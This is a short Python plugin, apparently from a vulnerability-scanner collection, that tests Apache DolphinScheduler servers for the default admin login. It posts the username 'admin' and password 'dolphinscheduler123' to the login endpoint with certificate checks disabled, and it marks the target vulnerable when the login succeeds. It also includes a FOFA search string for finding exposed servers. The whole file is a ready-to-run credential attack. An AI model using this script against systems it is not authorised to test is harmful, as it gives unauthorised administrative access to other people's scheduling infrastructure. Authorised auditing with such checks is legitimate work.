#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'Apache DolphinScheduler Default Login',

      'level'     :   'high',

      'FOFA'      :   'title="DolphinScheduler"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept': 'application/json, text/plain, */*',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Origin': url,
      'Referer': f'{url}/view/login/index.html',
      'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'zh-CN,zh;q=0.9',
      'Cookie': 'language=zh_CN',
      'Connection': 'close',
      }
  target = '/dolphinscheduler/login'
  data = 'userName=admin&userPassword=dolphinscheduler123'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'code.*?msg":"login success"',res.text,re.S):
      ret['huixian'] = 'admin/dolphinscheduler123'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret